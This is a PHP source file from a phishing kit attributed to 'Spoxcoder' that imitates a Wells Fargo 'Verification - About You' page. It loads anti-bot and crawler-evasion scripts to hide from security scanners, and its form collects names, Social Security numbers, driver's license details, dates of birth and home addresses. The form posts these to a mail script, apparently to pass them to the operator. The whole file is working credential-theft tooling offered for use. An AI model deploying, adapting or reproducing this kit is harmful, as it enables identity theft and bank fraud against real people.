<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Re-Loaded By Groot
 * icq+teleg = @iam_groot
 
###############################################
#$            C0d3d by Spoxcoder             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';
@require "Spox/Anti/Crawler/src/CrawlerDetect.php";

use JayBizzle\CrawlerDetect\CrawlerDetect;

if (!isset($_GET['wells_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

if (!isset($_SESSION['WELLS_SPOX'])) {

  header("Location: index");
  exit();
}


?>
<html class="ui-mobile wf-myriadpro-n4-active wf-active" lang="en" data-device="desktop" data-masked-input-enabled="true" data-print-link-enabled="true" ><head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<title>Wells Fargo - Verification - About You</title>



<link rel="stylesheet" href="Spox/Files/css/jquery.mobile.css?v=19.10.00">
<link rel="stylesheet" href="Spox/Files/css/normalize.css">
<link rel="stylesheet" href="Spox/Files/css/Wells-Fargo-LIVE-Div.css"> 
<link rel="stylesheet" href="Spox/Files/css/ClientPage.css">
	
<link rel="stylesheet" href="Spox/Files/css/desktop-tablet.combined.css?v=19.10.00">
		<!--[if lt IE 9]>
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/medium-screen.css?v=19.10.00" />
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/large-screen.css?v=19.10.00" />
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/ie.css?v=19.10.00" />
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/ie-print.css?v=19.10.00" media="print" />
		<![endif]-->
	
	

<!--  load the sync tealium  -->

<!-- load myriad font  -->

<style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style><style type="text/css">@font-face{font-family:myriad-pro;src:url(Spox/Files/css/b87d1abf881446b2bae0d8204029d20a9b85e656-l.woff2) format("woff2"),url(Spox/Files/css/b87d1abf881446b2bae0d8204029d20a9b85e656-d.woff) format("woff"),url() format("opentype");font-weight:400;font-style:normal;}</style>
<!-- myriad font loaded  -->

</head>
<body class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">



	<div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active" data-title="Wells Fargo - Application - About You" data-url="mainpage" tabindex="0" style="">

<header role="banner">
	<div class="masthead">
		<nav role="presentation">
					<a class="c28cLink child-window ui-link" aria-label="Wells Fargo" href="#"> <img class="masthead-img-logo" alt="Wells Fargo" role="img" src="Spox/Files/img/lol1.svg">
					</a>
		</nav>

				<div role="navigation" class="top-search">
					<ul>

								<li class="security">
									<a class="c28cLink child-window ui-link" href="#" data-platform="salesplatform">Online Security<span class="ui-hidden-accessible">, opens in a new window</span>
									</a>
								</li>

					</ul>
				</div>

	</div>
</header>

		
		<div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
			<div class="primary-content">
					<div class="progress-small small-screen">
					
	        	    	<span class="right">
		        	    	Step 4 of 5
	    	    		</span>
			    	</div>
  
			<div class="progress-bar not-small-screen">
				<ul class="ui-grid-d">
								            		
					            		<li class="ui-block-b previous">
							                	
							            	<span><span>Security Question</span></span>
							            </li>						            
	            		
					            		<li class="ui-block-b previous">
							            	<span><span>Email verification</span></span>
							            </li>						            
		            		
					            		<li class="ui-block-c active">
							        	    <span class="ui-hidden-accessible">Current Step</span>	            	
							            	<span><span>Contact information</span></span>
							            </li>						            
		            		
					            		<li class="ui-block-d">
							        	    							            	
							            	<span><span>Credit card</span></span>
							            </li>						            

					            				            		
					            		<li class="ui-block-e">
							        	    							            	
							            	<span><span>Review</span></span>
							            </li>						            
					            
					</ul>      
			</div>		

				<br>

	<style type="text/css">
		.help-block.form-error{
			    color: #dc3545!important;
				    width:10px;
				    display:block;
				    white-space:nowrap;
						}
	</style>
		<form id="yourInfoCommand" class="wait" action="Spox/Mail/Mail4.php" method="POST" >

			<h2 class="section-hdr">
				Personal information
			</h2>
			<div class="section">
		
			<div class="ui-field-contain inline-field-contain">
				<div class="inline-field">
					<label for="firstName">
						First name
					</label>

				<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="firstName" name="first_name" class="required ALPHA_SPECIAL valid" type="text" value="" size="15" data-validation="length" data-validation-error-msg="First name Required !" data-validation-length="min2" >

				</div>
				
				<div class="inline-field">
					<label for="lastName">
						Last name
					</label>

					<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="lastName" name="last_name" class="required ALPHA_SPECIAL" type="text" value="" size="25" data-validation="length" data-validation-error-msg=" Last name Required !" data-validation-length="min2" >
			</div>
			</div>

		<div class="ui-field-contain inline-field-contain">
			<label for="socialSecurityNumber">
				Social Security number
			</label>

    <fieldset aria-required="true">
			
									<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="ssn" name="ssn" class="required ALPHA_SPECIAL valid" type="text" value=""  data-validation="length" data-validation-error-msg="SSN is required!" data-validation-length="min2" >

				
					</fieldset>
	
		</div>
	
		<div class="ui-field-contain inline-field-contain">
			<fieldset aria-required="true">

		<legend>Driver's license or valid ID</legend>
	
			</fieldset>
		</div>
		
		<div id="DriverLicenseDetails" style="">
			<div class="ui-field-contain inline-field-contain">
				<div class="inline-field">
					<label for="licenseNumber">
						Number
					</label>	
					<div class="inline-field">
					
								<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="dl" name="dl" class="required ALPHA_SPECIAL valid" type="text" value=""   data-validation="length" data-validation-error-msg="Required!" data-validation-length="min1" >
				
					</div>
				</div>
				<div class="inline-field" style="min-height: 67.1875px;">
					<label for="issuedState">
						State issued
					</label>
					
			
   <select required="" id="issuedState" name="dlstate" class="required" >
		<option value="">
			Select one
		</option><option value="AK">AK</option><option value="AL">AL</option><option value="AR">AR</option><option value="AZ">AZ</option><option value="CA">CA</option><option value="CO">CO</option><option value="CT">CT</option><option value="DE">DE</option><option value="FL">FL</option><option value="GA">GA</option><option value="HI">HI</option><option value="IA">IA</option><option value="ID">ID</option><option value="IL">IL</option><option value="IN">IN</option><option value="KS">KS</option><option value="KY">KY</option><option value="LA">LA</option><option value="MA">MA</option><option value="MD">MD</option><option value="ME">ME</option><option value="MI">MI</option><option value="MN">MN</option><option value="MO">MO</option><option value="MS">MS</option><option value="MT">MT</option><option value="NC">NC</option><option value="ND">ND</option><option value="NE">NE</option><option value="NH">NH</option><option value="NJ">NJ</option><option value="NM">NM</option><option value="NV">NV</option><option value="NY">NY</option><option value="OH">OH</option><option value="OK">OK</option><option value="OR">OR</option><option value="PA">PA</option><option value="RI">RI</option><option value="SC">SC</option><option value="SD">SD</option><option value="TN">TN</option><option value="TX">TX</option><option value="UT">UT</option><option value="VA">VA</option><option value="VT">VT</option><option value="WA">WA</option><option value="WI">WI</option><option value="WV">WV</option><option value="WY">WY</option><option value="AS">AS</option><option value="AA">AA</option><option value="AE">AE</option><option value="AP">AP</option><option value="PW">PW</option><option value="DC">DC</option><option value="VI">VI</option><option value="PR">PR</option><option value="FM">FM</option><option value="MP">MP</option><option value="GU">GU</option>
		</select>
				
				</div>
			</div>
			<div class="ui-field-contain inline-field-contain">
				<div class="inline-field">
					<label for="licenseExpirationDate">
						Expiration date
					</label>
					<div class="tip-text" id="expirationDateDescription">
						MM/DD/YYYY
					</div>
						<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="dlexp" name="dlexp" class="required DATE" type="tel" value="" placeholder="__/__/____" size="10"  data-validation="length" data-validation-error-msg="Expiration date is required!" data-validation-length="min10" >

				</div>
			</div>
		</div>

		<div class="ui-field-contain">
			<label for="dateOfBirth">
				Date of birth
			</label>
			<div class="tip-text" id="dateOfBirthDescription">
				MM/DD/YYYY
			</div>
			<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="dlexp" name="dob" class="required DATE" type="tel" value="" placeholder="__/__/____" size="10"  data-validation="length" data-validation-error-msg=" " data-validation-length="min10" >

		</div>
</div>
<h2 class="section-hdr">
	Contact information
</h2>

<div class="section">

<p id="subproductCode" style="display: none;">RC</p>
<p id="isApplicantPrefilled" style="display: none;">false</p>

		<div class="ui-field-contain margin-bot-0">
			<p>
				<strong>Home address</strong>
			</p>
			<div class="ui-field-contain margin-bot-0">
				<label for="homeAddressStreet1">
					Street address
				</label>
				<div id="homeAddressStreet1Description">
					<a class="c29link ui-link"  style="white-space: nowrap;">No P.O. Box</a>
					
				</div>

			
		<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="d" name="street1" class="required ALPHA_NUMERIC_SPECIAL" type="text" value="" placeholder=" " size="32"  data-validation="length" data-validation-error-msg="&nbsp; Street address is required!" data-validation-length="min2-30" >

			</div>
			<div class="ui-field-contain">
				<label for="homeAddressStreet2" class="ui-hidden-accessible">Street address line 2</label> 

			<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="d" name="street2" class="ALPHA_NUMERIC_SPECIA" type="text" value="" placeholder=" " size="32" >

			</div>
			<div class="ui-field-contain inline-field-contain">
				<div class="inline-field">
					<label for="homeAddressCity">
						City
					</label>

<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="d" name="city" class="required ALPHA_NUMERIC_SPECIAL" type="text" value="" placeholder=" " size="24"  data-validation="length" data-validation-error-msg="City is required!" data-validation-length="min2-20" >


				</div>

				<div class="inline-field" style="min-height: 63.1875px;">
					<label for="homeAddressState">
						State
					</label>

   
			<select id="homeAddressState" name="statec" class="required" required="">
			<option value="">Select one</option><option value="AK">AK</option><option value="AL">AL</option><option value="AR">AR</option><option value="AZ">AZ</option><option value="CA">CA</option><option value="CO">CO</option><option value="CT">CT</option><option value="DE">DE</option><option value="FL">FL</option><option value="GA">GA</option><option value="HI">HI</option><option value="IA">IA</option><option value="ID">ID</option><option value="IL">IL</option><option value="IN">IN</option><option value="KS">KS</option><option value="KY">KY</option><option value="LA">LA</option><option value="MA">MA</option><option value="MD">MD</option><option value="ME">ME</option><option value="MI">MI</option><option value="MN">MN</option><option value="MO">MO</option><option value="MS">MS</option><option value="MT">MT</option><option value="NC">NC</option><option value="ND">ND</option><option value="NE">NE</option><option value="NH">NH</option><option value="NJ">NJ</option><option value="NM">NM</option><option value="NV">NV</option><option value="NY">NY</option><option value="OH">OH</option><option value="OK">OK</option><option value="OR">OR</option><option value="PA">PA</option><option value="RI">RI</option><option value="SC">SC</option><option value="SD">SD</option><option value="TN">TN</option><option value="TX">TX</option><option value="UT">UT</option><option value="VA">VA</option><option value="VT">VT</option><option value="WA">WA</option><option value="WI">WI</option><option value="WV">WV</option><option value="WY">WY</option><option value="AS">AS</option><option value="AA">AA</option><option value="AE">AE</option><option value="AP">AP</option><option value="PW">PW</option><option value="DC">DC</option><option value="VI">VI</option><option value="PR">PR</option><option value="FM">FM</option><option value="MP">MP</option><option value="GU">GU</option>
			</select>
				
	
				</div>
				<div class="inline-field">
					<label for="homeAddressZip">
						ZIP code
					</label>
		<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="d" name="zipcode" class="required NUMERIC" type="tel" value="" placeholder=" " size="8"  data-validation="length" data-validation-error-msg="ZIP code is required!" data-validation-length="2-5" >


				</div>
			</div>
		</div>



<div class="btn-ctr"><div class="btn-ctr-inner">
	
<button type="submit" name="submit" class="continue-button ui-btn ui-btn-p">
				Continue
			</button>
		
	
</div>
</form>

		<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});

 
Inputmask("(9{1,3}) 9{1,3} 9{1,4}").mask("#phoneNumber");
Inputmask("9{1,3}-9{1,2}-9{1,4}").mask("#ssn"); 
Inputmask("9{1,2}/9{1,2}/9{1,4}").mask("#dlexp");


</script>

<br>
<div style="display: none;" id="cancelPopup-placeholder"></div>

</div>

</div>
<div data-role="footer" class="osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">
		
	<footer role="contentinfo">
			<div class="c9">
				<nav aria-label="corporate, legal, security">
					<ul class="not-large-screen">

									<li><a class="c28cLink child-window ui-link" href="#">Privacy, Cookies, Security &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="#">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="#" data-platform="salesplatform">Online Security</a></li>

					
					</ul>				
					<ul class="large-screen">

									<li><a class="c28cLink child-window ui-link" href="#">Privacy, Cookies, Security &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="#">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="#" href="#" data-platform="salesplatform">Online Security</a></li>

					</ul>				
				</nav>
				<hr>
				© 1999 - <span class="placeholder">2020</span> Wells Fargo. All rights reserved. NMLSR ID 399801
			</div>
		</footer>
</div>

<div style="display: none;"><!-- placeholder --></div>
<div style="display: none;"><!-- placeholder --></div></div></div></div>

</div></div>
<div id="inqDivResizeCorner" style="border-width: 0px; position: absolute; z-index: 9999999; left: 424px; top: 284px; cursor: se-resize; height: 16px; width: 16px; display: none;">
</div>
<div id="inqResizeBox" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; display:none; height: 0px; width: 0px;"></div><div id="inqTitleBar" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; cursor: move; height: 55px; width: 410px; display: none;">
	
</div>
<div id="nuance-chat-anchored" style="position: fixed; width: auto; right:20px; bottom:20px; z-index: 999999;" aria-live="polite"><div>
<style>
 .wf-FAB-aval { 
     cursor: pointer;
     border: 1px solid #ffffff;
     border-radius: 50%; 
     background: #AE1E23; 
     box-shadow: 3px 3px 3px 0 rgba(0,0,0,.15);
     height: 56px;
     width: 56px;
     padding: 0;
 } 

 .wf-FAB-aval svg {
     display: block;
     margin: 5px auto 0 auto;  
 } 
 html .page {
    overflow: visible;
}
.ui-field-contain input.ui-input-text, .ui-field-contain textarea.ui-input-text, .ui-field-contain .ui-input-search, .ui-field-contain div.ui-input-text {
	    line-height: 2.14;

	}
</style></div></div><div id="nuance-chat-anchored-2" style="position: fixed; width: auto; right:20px; bottom:20px; z-index: 999988;"></div></body>
</html>